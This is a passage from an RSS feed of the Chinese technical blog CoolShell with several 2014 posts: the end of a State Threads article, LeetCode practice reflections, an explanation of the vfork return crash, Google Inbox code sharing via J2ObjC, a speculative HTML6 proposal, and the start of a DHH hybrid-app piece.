<p>ST的主要限制在于，应用程序所有I/O操作必须使用ST提供的API，因为只有这样thread才能被调度器管理，并且避免阻塞。</p>
<p>另一个限制在于thread调试，这本身不容易，好在v1.9的ST提供了DEBUG参数，使用TREADQ以及_st_iterate_threads接口检测thread调度情况，用户还可自定义_st_show_thread_stack接口dump每个thread的栈，在GDB使能_st_iterate_threads_flag变量，这些都在Readme中对调试方法有具体说明。按下不表。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>这篇文章写得有点短了，主要是通过对比来介绍ST的，其实还有大段原理可以讲，大段源码以及实战用例可以贴，但这一下子又写不过来，ST还是有点技术含量的。说白了，<strong>ST的核心思想就是利用multi-threading的简单优雅范式胜过传统异步回调的复杂晦涩实现，又利用EDSM的性能和解耦架构避免了multi-threading在系统上的开销和暗礁。</strong>学习ST告诉我们一个道理：<strong>未来技术的趋势永远都是融合的。</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>在<a title="sourceforge源码" href="https://sourceforge.net/projects/state-threads/files/" target="_blank">SourceForge</a>以及<a title="github源码" href="https://github.com/winlinvip/state-threads" target="_blank">github</a>上的源码：前者有历史版本及win32版本，后者只有v1.9。</li>
</ul>
<ul>
<li>
<a title="State Threads for Internet Applications" href="http://state-threads.sourceforge.net/docs/st.html" target="_blank">State Threads for Internet Applications</a>：介绍原理的，值得一看，<a title="中文翻译" href="http://blog.csdn.net/win_lin/article/details/8242653" target="_blank">这里</a>有篇中文翻译附加单元测试（在单CPU 512M内存上创建数万个thread，CPU占用率约5%，内存约4.3K/thread）。</li>
</ul>
<ul>
<li>
<a title="State Threads Library FAQ" href="http://state-threads.sourceforge.net/docs/faq.html" target="_blank">State Threads Library FAQ</a>：本文基于此而写。</li>
</ul>
<ul>
<li>
<a title="API手册" href="http://state-threads.sourceforge.net/docs/reference.html" target="_blank">Complete reference</a>：API完全手册。</li>
</ul>
<ul>
<li>
<a title="注意事项" href="http://state-threads.sourceforge.net/docs/notes.html" target="_blank">Programing Notes</a>：编程注意事项，包括信号处理，IPC，非网络I/O事件等。</li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-10-12T22:48:57+08:00</pubDate>
<guid>https://coolshell.cn/articles/12012.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Leetcode 编程训练 ]]></title>
<link>https://coolshell.cn/articles/12052.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >Leetcode这个网站上的题都是一些经典的公司用来面试应聘者的面试题，很多人通过刷这些题来应聘一些喜欢面试算法的公司，比如：Google、微软、Facebook、Amazon之类的这些公司，基本上是应试教育的功利主义。</p>
<p>我做这些题目的不是为了要去应聘这些公司，而是为了锻炼一下自己的算法和编程能力。因为我开始工作的时候基本没有这样的训练算法和编程的网站，除了大学里的“算法和数据结构”里的好些最基础最基础的知识，基本上没有什么训练。所以，当我看到有人在做这些题的时候，我也蠢蠢欲动地想去刷一下。</p>
<p>于是，我花了3-4个月的业余时间，我把<a href="https://oj.leetcode.com/problems/" target="_blank">Leetcode的154道题</a>全部做完了。（这也是最近我没有太多的时间来写博客的原因，你可以看到我之前<a title="谜题的答案和活动的心得体会" href="https://coolshell.cn/articles/11847.html" target="_blank">做的那个活动</a>中有几个算法题来自于Leetcode）有人说我时间太多了，这里声明一下，我基本上都是利用了晚上10点以后的时间来做这些题的。</p>
<p>LeetCode的题大致分成两类：</p>
<p style="padding-left: 30px;"><strong>1）基础算法的知识</strong>。这些题里面有大量的算法题，解这些题都是有套路的，不是用递归（深度优先DFS，广度优先BFS），就是要用动态规划（Dynamic Programming），或是拆半查找（Binary Search），或是回溯（Back tracing），或是分治法（Divide and Conquer），还有大量的对树，数组、链表、字符串和hash表的操作。<strong>通过做这些题能让你对这些最基础的算法的思路有非常扎实的了解和训练</strong>。对我而言，Dynamic Programming 是我的短板，尤其是一些比较复杂的问题，在推导递推公式上总是有思维的缺陷（数学是我的硬伤），通过做了这些题后，我能感到我在DP的思路上有了很大的收获。</p>
<p style="padding-left: 30px;"><strong>2）编程题</strong>。比如：atoi，strstr，add two num，括号匹配，字符串乘法，通配符匹配，文件路径简化，Text Justification，反转单词等等，这些题的Edge Case, Corner Case有很多。这些题需要你想清楚了再干，只要你稍有疏忽，就会有几个case让你痛不欲生，而且一不小心就会让你的代码会写得又臭又长，无法阅读。<strong>通过做这些题，可以非常好的训练你对各种情况的考虑，以及你对程序代码组织的掌控（其实就是其中的状态变量）。</strong>还记得我在《<a title="函数式编程" href="https://coolshell.cn/articles/10822.html" target="_blank">函数式编程</a>》中说的，程序中的状态是你程序变得复杂难维护的直接原因。</p>
<p>我觉得每个程序员都应该花时间和精力做这些题，因为你会从这些题中得到很大的收益。做完这些题后你一定会明白下面几个道理：</p>
<p><span id="more-12052"></span></p>
<p style="padding-left: 30px;"><strong>1）想清楚了再干</strong>。这个观点我以前就在《<a title="多些时间能少写些代码" href="https://coolshell.cn/articles/5686.html" target="_blank">多些时间可以少些代码</a>》说过。如果你拿到题就上去直接写代码的话，你一定会被各种case打回来了。然后呢，你一着急，你就会进入那种我在《<a title="开发团队的效率" href="https://coolshell.cn/articles/11656.html" target="_blank">开发团队的效率</a>》中说的那种毫无效率case by case的开发模式，而你也进入了“平庸模式”。于是你就会出现下图那样的情况。</p>
<figure id="attachment_12053" aria-describedby="caption-attachment-12053" style="width: 440px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-12053" class="wp-caption-text">Case-by-Case Development</figcaption></figure>
<p style="padding-left: 30px;"><strong>2) 编程是脑力劳动，急不得</strong>。这个事情在这做这些题的时候你就会发现，要么是脑子转不过来了，要么就是明明就差一点了，但程序怎么都调不对。如果你越着急的话，你就会发现你会离目标越远，而花的时间也会更多。另外，你会发现这些题基本上都是50行代码内就可以搞定的，但是为了这50行以内的代码，你要花好多时间和精力。coding  50行代码在我们的日常工作中分分钟就完成，而Leetcode里的50行代码却没那么简单，也许，用这个你就可以区别什么是码农，什么是程序员了。</p>
<p style="padding-left: 30px;"><strong>3）加班要不得。</strong>因为我总是在晚上10点以后做题，所以，基本上都是在加班状态中工作。这种状态过上两三天，你就会发现，整个大脑已经不转了，而且不但不转，还会犯很多低级错误，很多事情都想不清楚，一个晚上都在和程序的状态控制做搏斗，代码写得越来越乱，越来越没条理。于是这种时候，我都会休息几天，不做题了，然后再做题的时候，就觉得非常地清楚。可见加班 是编程最致命的敌人！</p>
<p>我把我的C++代码放到了Github上，大家也帮我review一下，看看有没有可以改善的。</p>
<p style="text-align: center;"><strong><a href="https://github.com/haoel/leetcode" target="_blank">https://github.com/haoel/leetcode</a></strong></p>
<p>好了，不多说了，<strong>我希望大家有时间都去练练LeetCode，无论是找工作还是对你的编程能力会有非常大的提高</strong>。</p>
<p> </p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-10-23T10:51:54+08:00</pubDate>
<guid>https://coolshell.cn/articles/12052.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ vfork 挂掉的一个问题 ]]></title>
<link>https://coolshell.cn/articles/12103.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >在知乎上，有个人问了这样的<a href="https://www.zhihu.com/question/26591968" target="_blank">一个问题</a>——为什么vfork的子进程里用return，整个程序会挂掉，而且exit()不会？并给出了如下的代码，下面的代码一运行就挂掉了，但如果把子进程的return改成exit(0)就没事。</p>
<p>我受邀后本来不想回答这个问题的，因为这个问题明显就是RTFM的事，后来，发现这个问题放在那里好长时间，而挂在下面的几个答案又跑偏得比较严重，我觉得可能有些朋友看到那样的答案会被误导，所以就上去回答了一下这个问题。</p>
<p>下面我把问题和我的回答发布在这里，也供更多的人查看。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
int main(void) {
    int var;
    var = 88;
    if ((pid = vfork()) &lt; 0) {
        printf("vfork error");
        exit(-1);
    } else if (pid == 0) { /* 子进程 */
        var++;
        return 0;
    }
    printf("pid=%d, glob=%d, var=%d\n", getpid(), glob, var);
    return 0;
}
</pre>
<p><span id="more-12103"></span></p>
<h4><b>基础知识</b></h4>
<p>首先说一下fork和vfork的差别：</p>
<ul>
<li>fork 是 创建一个子进程，并把父进程的内存数据copy到子进程中。</li>
<li>vfork是 创建一个子进程，并和父进程的内存数据share一起用。</li>
</ul>
<p>这两个的差别是，一个是copy，一个是share。（关于fork，可以参看酷壳之前的《<a title="一个fork的面试题" href="https://coolshell.cn/articles/7965.html" target="_blank">一道fork的面试题</a>》）</p>
<p>你 man vfork 一下，你可以看到，vfork是这样的工作的，</p>
<p style="padding-left: 30px;">1）保证子进程先执行。<br>
2）当子进程调用exit()或exec()后，父进程往下执行。</p>
<p>那么，为什么要干出一个vfork这个玩意？ 原因在man page也讲得很清楚了：</p>
<blockquote>
<p><strong>Historic Description</strong></p>
<p>Under Linux, fork(2) is implemented using copy-on-write pages, so the only penalty incurred by fork(2) is the time and memory required to duplicate the parent’s page tables, and to create a unique task structure for the child. <b>However, in the bad old days a fork(2) would require making </b><b>a complete copy of the caller’s data space, often needlessly, since usually immediately afterwards an exec(3) is done. Thus, for greater efficiency, BSD introduced the vfork() system call, which did not fully copy the address space of the parent process, but borrowed the parent’s mem</b><b>ory and thread of control until a call to execve(2) or an exit occurred.</b> The parent process was suspended while the child was using its resources. The use of vfork() was tricky: for example, not modifying data in the parent process depended on knowing which variables are held in a register.</p>
</blockquote>
<p>意思是这样的—— <b>起初只有fork，但是很多程序在fork一个子进程后就exec一个外部程序，于是fork需要copy父进程的数据这个动作就变得毫无意了，而且这样干还很重</b>（注：后来，fork做了优化，详见本文后面）<b>，所以，BSD搞出了个父子进程共享的 vfork，这样成本比较低。因此，vfork本就是为了exec而生。</b></p>
<h4><b>为什么return会挂掉，exit()不会？</b></h4>
<p>从上面我们知道，<b>结束子进程的调用是exit()而不是return，如果你在vfork中return了，那么，这就意味main()函数return了，注意因为函数栈父子进程共享，所以整个程序的栈就跪了。</b></p>
<p>如果你在子进程中return，那么基本是下面的过程：</p>
<p style="padding-left: 30px;"><b>1）子进程的main() 函数 return了，于是程序的函数栈发生了变化。</b></p>
<p style="padding-left: 30px;"><b>2）而main()函数return后，通常会调用 exit()或相似的函数</b>（如：_exit()，exitgroup()）</p>
<p style="padding-left: 30px;"><b>3）这时，父进程收到子进程exit()，开始从vfork返回，但是尼玛，老子的栈都被你子进程给return干废掉了，你让我怎么执行？</b>（注：栈会返回一个诡异一个栈地址，对于某些内核版本的实现，直接报“栈错误”就给跪了，然而，对于某些内核版本的实现，于是有可能会再次调用main()，于是进入了一个无限循环的结果，直到vfork 调用返回 error）</p>
<p>好了，现在再回到 return 和 exit，return会释放局部变量，并弹栈，回到上级函数执行。exit直接退掉。如果你用c++ 你就知道，return会调用局部对象的析构函数，exit不会。（注：exit不是系统调用，是glibc对系统调用 _exit()或_exitgroup()的封装）</p>
<p>可见，<b>子进程调用exit() 没有修改函数栈，所以，父进程得以顺利执行</b>。</p>
<p><strong>但是！注意！如果你调用 exit() 函数，还是会有问题的，正确的方法应该是调用 _exit() 函数，因为 exit() 函数 会 flush 并 close 所有的 标准 I/O ，这样会导致父进程受到影响。（这个情况在fork下也会受到影响，会导致一些被buffer的数据被flush两次，这里可以参看《<a href="https://coolshell.cn/articles/7965.html" target="_blank">一个fork的面试题</a>》）</strong></p>
<h4>关于fork的优化</h4>
<p>很明显，fork太重，而vfork又太危险，所以，就有人开始优化fork这个系统调用。优化的技术用到了著名的<b>写时拷贝（COW）</b>。</p>
<p>也就是说，<strong>对于fork后并不是马上拷贝内存，而是只有你在需要改变的时候，才会从父进程中拷贝到子进程中，这样fork后立马执行exec的成本就非常小了</strong>。所以，Linux的Man Page中并不鼓励使用vfork() ——</p>
<blockquote><p>“ It is rather unfortunate that Linux revived this specter from the past. The BSD man page states: “This system call will be eliminated when proper system sharing mechanisms are implemented. Users should not depend on the memory sharing semantics of vfork() as it will, in that case, be made synonymous to fork(2).””</p></blockquote>
<p>于是，从BSD4.4开始，他们让vfork和fork变成一样的了</p>
<p>但在后来，NetBSD 1.3 又把传统的vfork给捡了回来，说是vfork的性能在 Pentium Pro 200MHz 的机器（这机器好古董啊）上有可以提高几秒钟的性能。详情见——“<a class=" wrap external" href="https://www.netbsd.org/docs/kernel/vfork.html" target="_blank" rel="nofollow noreferrer">NetBSD Documentation: Why implement traditional vfork()<i class="icon-external"></i></a>”</p>
<p>今天的Linux下，fork和vfork还是各是各的，不过，还是建议你不要用vfork，除非你非常关注性能。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-11-21T00:48:27+08:00</pubDate>
<guid>https://coolshell.cn/articles/12103.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Google Inbox如何跨平台重用代码？ ]]></title>
<link>https://coolshell.cn/articles/12136.html</link>
<content><![CDATA[ 
<p>原文链接《<a href="https://arstechnica.com/information-technology/2014/11/how-google-inbox-shares-70-of-its-code-across-android-ios-and-the-web" target="_blank">How Google Inbox shares 70% of its code across Android, iOS, and the Web</a>》</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2014/11/inbox2-640x264.jpg"><img alt="image placeholder" ></a></p>
<p>开发一个移动应用在当下并不是一件容易的事情。如果想要获得最多的用户，你的应用通常需要覆盖 iOS, Android, 和 Web 三大平台。这就意味着同一个应用需要开发三个版本，使用 Objective-C 或者 Swift 开发 iOS 版本，使用 Java 开发 Android 版本，使用 JavaScript/CSS/HTML5 开发 Web 版本。工作量增大的同时也意味着有更多的 bug 需要修复。</p>
<p>这个问题也是 Google 在开发 Google Inbox 时致力要解决的。在最近发布的这款应用中，Google 使用了一些工具实现了70%的代码跨平台复用。</p>
<p>Google Inbox 覆盖 iOS, Android, Web 三个平台，它们使用的是同一个后台代码逻辑，只是前端的用户体验和平台相关特性的实现有所不同。Google 自主开发了一套辅助工具将 Android 版本的 Java 代码逻辑编译为 Objective-C (针对 iOS 平台) 和 JavaScript (针对 Web 浏览器)。 Java 到 JavaScript 的编译由 Google Web Toolkit SDK 完成，Java 到 Objective-C 的编译则由 J2ObjC （<a href="j2objc.org">j2objc.org</a>）来完成。</p>
<p>J2ObjC 是一个开源项目，由 Google 在2013年发布。Google Sheets (Google Docs 中的电子表格部分) 也使用了 J2ObjC，而 Google Inbox 则是目前使用 J2Objc 最多的 Google 项目。</p>
<p>Google Inbox 复用的代码逻辑包括：对话 (conversations)，提醒 (reminders)，联系人 (contacts)。还有网络相关功能和离线同步。这些代码逻辑的复用节省了大量的时间和成本。</p>
<p>在产品设计时，Google 将这些可复用功能划分为抽象的逻辑概念，比如：提醒的逻辑放在 “reminder.java” 中，可以被 Android UI 调用。对 iOS 版本而言，J2ObjC 将 “reminder.java” 编译成 Objective-C 代码，再由 iOS UI 调用。</p>
<p>Google 没有跨平台编译 UI 部分的代码，因为不同平台的UI特性各有不同，盲目统一会导致非常糟糕的用户体验。代码复用只是针对可以共享的后台逻辑，前端的UI实现是完全原生 (native) 的。这与 Xamarin (一个基于 Microsoft C# 的跨平台移动开发工具) 提出的概念类似。</p>
<p>跨平台代码复用通常会带来一些性能上的问题。Garrick Toubassi，Engineering Director 和 Google Inbox 项目组成员，对此表示： “性能上的影响如果有的话，也可以说是微不足道的。我们做过大量的性能测试。因为没有加入额外的中间层来处理跨平台兼容性，所有代码最后都是平台原生代码。J2ObjC 编译生成的目标代码和 Java 源代码拥有大致相同的对象数量和对象图谱复杂度 (object graph complexity) ”。</p>
<p>Google 使用的整套方法解决了跨平台移动开发中的一个很重要的问题，同时也推进了安卓先行 (Android-first) 的移动开发策略。</p>
<p>更多 Google Inbox 文章请猛戳 <a href="https://gmailblog.blogspot.com.au/2014/11/going-under-hood-of-inbox.html">Gmail 官方博客</a>。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-11-26T08:03:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/12136.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ HTML6 展望 ]]></title>
<link>https://coolshell.cn/articles/12206.html</link>
<content><![CDATA[ 
<h3><img alt="image placeholder" ></h3>
<h3>HTML5 概述</h3>
<p>HTML5 是 HTML 语言最受欢迎的版本之一，它支持音频和视频、离线存储、移动端、和标签属性等等。还提供了&lt;article&gt;, &lt;section&gt;, &lt;header&gt;这样的标签来帮助开发者更好地组织页面内容。然而 HTML5 规范仍然没有最后定稿，并且它并不是一个真正意义上的语义标记语言。</p>
<h3>HTML6 展望</h3>
<p>你有没有曾经希望能在 HTML 中使用自定义标签？比如：使用&lt;logo&gt;来显示你的网站logo，还有使用&lt;toolbar&gt;来显示工具栏等等。我们经常使用&lt;div id=”container”&gt;和&lt;div id=”wrapper”&gt;来组织页面，在 HTML6 里我们希望可以直接使用象&lt;container&gt;和&lt;wrapper&gt;这样的自定义标签。</p>
<p>和 XML 一样，HTML6 应该支持 namespace（命名空间），如：xmlns:xhtml=”http://www.w3.org/1999/xhtml”</p>
<p>HTML6 代码样例：</p>
<p><span id="more-12206"></span></p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;html:title&gt;A Look Into HTML6&lt;/html:title&gt;
 &lt;html:meta type="title" value="Page Title"&gt;
 &lt;html:meta type="description" value="HTML example with namespaces"&gt;
 &lt;html:link src="css/mainfile.css" title="Styles" type="text/css"&gt;
 &lt;html:link src="js/mainfile.js" title="Script" type="text/javascript"&gt;
 &lt;/html:head&gt;
 &lt;html:body&gt;
 &lt;header&gt;
 &lt;logo&gt;
 &lt;html:media type="image" src="images/xyz.png"&gt;
 &lt;/logo&gt;
 &lt;nav&gt;
 &lt;html:a href="/img1"&gt;a1&lt;/a&gt;
 &lt;html:a href="/img2"&gt;a2&lt;/a&gt;
 &lt;/nav&gt;
 &lt;/header&gt;
 &lt;content&gt;
 &lt;article&gt;
 &lt;h1&gt;Heading of main article&lt;/h1&gt;
 &lt;h2&gt;Sub-heading of main article&lt;/h2&gt;
 &lt;p&gt;[...]&lt;/p&gt;
 &lt;p&gt;[...]&lt;/p&gt;
 &lt;/article&gt;
 &lt;article&gt;
 &lt;h1&gt;The concept of HTML6&lt;/h1&gt;
 &lt;h2&gt;Understanding the basics&lt;/h2&gt;
 &lt;p&gt;[...]&lt;/p&gt;
 &lt;/article&gt;
 &lt;/content&gt;
 &lt;footer&gt;
 &lt;copyright&gt;This site is © to Anonymous 2014&lt;/copyright&gt;
 &lt;/footer&gt;
 &lt;/html:body&gt;
 &lt;/html:html&gt;</pre>
<p>在上面的代码中，你也许注意到了一些奇怪的&lt;html:x&gt;标签，它们是 W3C 和 HTML6 规范中在命名空间里定义的标签。例如：&lt;html:title&gt;负责设定你浏览器的标题栏文字，&lt;html:media&gt;负责显示图片等等。用户可以自己定义标签以便 JavaScript 和 CSS 识别和处理，这样页面代码会更易读，语义更清晰。</p>
<h3>HTML6 APIs</h3>
<p>HTML6 的标签前带有命名空间，如：&lt;html:html&gt;, &lt;html:head&gt;等等。</p>
<p>1. &lt;html:html&gt;</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;// this is equivalent to &lt;html&gt; tag written in previous HTML versions
 &lt;!-- sample of HTML document --&gt;
 &lt;/html:html&gt;</pre>
<p>2. &lt;html:head&gt; 和 &lt;head&gt; 标签一样。</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;!-- Main content would come here, like the &lt;html:title&gt; tag --&gt;
 &lt;/html:head&gt;
 &lt;/html:html&gt;</pre>
<p>3. &lt;html:title&gt; 和 &lt;title&gt; 标签类似。</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;html:title&gt;A Look Into HTML6&lt;/html:title&gt;
 &lt;/html:head&gt;
 &lt;/html:html&gt;</pre>
<p>4. &lt;html:meta&gt; 和 &lt;meta&gt; 标签类似，不同之处在于，在 HTML5 中你只能使用标准的元数据类型，如：”keywords”, “description”, “author”等，而在 HTML6 中你可以使用任何元数据类型。</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;html:title&gt;A Look Into HTML6&lt;/html:title&gt;
 &lt;html:meta type="description" value="HTML example with namespaces"&gt;
 &lt;/html:head&gt;
 &lt;/html:html&gt;</pre>
<p>5. &lt;html:link&gt; 和 HTML6 之前版本的 &lt;link&gt; 标签类似。</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;html:title&gt;A Look Into HTML6&lt;/html:title&gt;
 &lt;html:link src="js/mainfile.js" title="Script" type="text/javascript"&gt;
 &lt;/html:head&gt;
 &lt;/html:html&gt;</pre>
<p>6. &lt;html:body&gt; 和 &lt;body&gt; 标签一样。</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;html:title&gt;A Look Into HTML6&lt;/html:title&gt;
 &lt;/html:head&gt;
 &lt;html:body&gt;
 &lt;!-- This is where your website content is placed --&gt;
 &lt;/html:body&gt;
 &lt;/html:html&gt;</pre>
<p>7. &lt;html:a&gt; 和 &lt;a&gt; 标签类似，区别是 &lt;html:a&gt; 只有 “href” 一个属性。</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;html:title&gt;A Look Into HTML6&lt;/html:title&gt;
 &lt;/html:head&gt;
 &lt;html:body&gt;
 &lt;html:a href="http://siteurl"&gt;Go to siteurl.com!&lt;/html:a&gt;
 &lt;/html:body&gt;
 &lt;/html:html&gt;</pre>
<p>8. &lt;html：button&gt; 和 &lt;button&gt; 及 &lt;input type=”button”&gt; 一样。</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;html:title&gt;A Look Into HTML6&lt;/html:title&gt;
 &lt;/html:head&gt;
 &lt;html:body&gt;
 &lt;html:button&gt;Click Here&lt;/html:button&gt;
 &lt;/html:body&gt;
 &lt;/html:html&gt;</pre>
<p>9. &lt;html:media&gt; 涵盖 &lt;img&gt;, &lt;video&gt;, &lt;embed&gt; 等标签的所有功能。&lt;html:media&gt; 的好处是你不用根据不同的媒体文件类型使用不同的标签，媒体的类型由浏览器从文件内容（类型属性，扩展名，和MIME type）中来判断。</p>
<pre>&lt;!DOCTYPE html&gt;
 &lt;html:html&gt;
 &lt;html:head&gt;
 &lt;html:title&gt;A Look Into HTML6&lt;/html:title&gt;
 &lt;/html:head&gt;
 &lt;html:body&gt;
 &lt;!-- Image would come here --&gt;
 &lt;html:media src="img1/logo.jpg" type="image"&gt;
 &lt;!-- Video doesn't need a type --&gt;
 &lt;html:media src="videos/slide.mov"&gt;
 &lt;/html:body&gt;
 &lt;/html:html&gt;</pre>
<h3>标签类型(Tag types)概述</h3>
<p>和 HTML5 一样， HTML6 也有两种标签类型：单标签（single tag) 和双标签（double tag）</p>
<pre>&lt;html:meta type="author" content="single tag"&gt;
 &lt;html:meta type="author" content="double tag" /&gt;</pre>
<p>单标签不需要结束符’/’</p>
<h3>结语</h3>
<p>HTML6 规范还未发布，本文原作者 <a href="http://html6spec.com/">Oscar Godson</a> 只是为我们提供了一个对 HTML6 规范的展望，或者说他希望 HTML6 能够支持的一些新特性。</p>
<p>原文链接：<a href="http://java.dzone.com/articles/look-html6-what-it-and-what">A Look Into HTML6 – What Is It, and What Does it Have to Offer?</a></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-12-06T12:41:34+08:00</pubDate>
<guid>https://coolshell.cn/articles/12206.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ DHH 谈混合移动应用开发 ]]></title>
<link>https://coolshell.cn/articles/12225.html</link>
<content><![CDATA[ 
<p> </p>
<p style="text-align: right;"><img alt="image placeholder" >David，Ruby on Rails 作者，37signals 合伙人</p>
<p style="text-align: right;">畅销书作家、演说家、赛车手、业余摄影师、顾家好男人</p>
<p> </p>
<p><a href="https://37signals.com/" target="_blank">37signals</a> 在2013年2月发布了 Basecamp 的 iPhone app，在此之前我们就使用原生开发（native）还是混合开发（hybrid）做了许多尝试。在2012年项目启动的时候，大多数人都倾向于原生开发。</p>
<p>Facebook 在2012年发布了他们新的 iOS app，为了获得更好的用户体验，他们放弃了原来的 HTML5 混合开发方式。考虑到2010～2011年的时候，HTML 在移动端的性能确实不尽如人意，这个决定在当时看来也在情理之中。2010年的时候我们觉得 iPhone 3G/3GS 够眩够快，但按照现在的标准来看它们就太慢了。因此在为移动应用开发做架构设计时，我们需要考虑新的移动设备的计算能力，而不是那些老的过时的设备。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E4%B8%8D%E9%9C%80%E8%A6%81%E8%BF%87%E5%A4%9A%E8%80%83%E8%99%91%E8%AE%BE%E5%A4%87%E7%9A%84%E6%80%A7%E8%83%BD" title="移动开发架构设计不需要过多考虑设备的性能">移动开发架构设计不需要过多考虑设备的性能</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%AC%AC%E4%B8%80%E4%BB%A3%E4%BA%A7%E5%93%81%EF%BC%9A%E5%8E%9F%E7%94%9F%E5%A4%96%E5%A3%B3native_shell%EF%BC%8B%E5%B5%8C%E5%A5%97WebView" title="第一代产品：原生外壳(native shell)＋嵌套WebView">第一代产品：原生外壳(native shell)＋嵌套WebView</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%AC%AC%E4%BA%8C%E4%BB%A3%E4%BA%A7%E5%93%81%EF%BC%9A%E5%8E%9F%E7%94%9F%E5%A4%96%E5%A3%B3%EF%BC%8B%E5%8E%9F%E7%94%9F%E5%AF%BC%E8%88%AA%E7%95%8C%E9%9D%A2" title="第二代产品：原生外壳＋原生导航界面">第二代产品：原生外壳＋原生导航界面</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%9B%A0%E5%9C%B0%E5%88%B6%E5%AE%9C%E5%9C%B0%E8%BF%90%E7%94%A8%E5%8E%9F%E7%94%9F%E5%BC%80%E5%8F%91%E6%96%B9%E5%BC%8F" title="因地制宜地运用原生开发方式">因地制宜地运用原生开发方式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%B7%B7%E5%90%88%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E6%8A%80%E6%9C%AF" title="混合开发模式使用的技术">混合开发模式使用的技术</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%B7%B7%E5%90%88%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E5%AF%B9%E5%8E%9F%E7%94%9F%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8C%91%E6%88%98" title="混合开发模式对原生开发模式的挑战">混合开发模式对原生开发模式的挑战</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E4%B8%8D%E9%9C%80%E8%A6%81%E8%BF%87%E5%A4%9A%E8%80%83%E8%99%91%E8%AE%BE%E5%A4%87%E7%9A%84%E6%80%A7%E8%83%BD"></span>移动开发架构设计不需要过多考虑设备的性能<span class="ez-toc-section-end"></span>
</h4>
<p>我们从一些测试中得出的一个结论是：现在的移动设备计算能力都很强，运行原生应用和 HTML 应用的效果差别不大，而 HTML 开发的成本则要比原生开发小得多。</p>
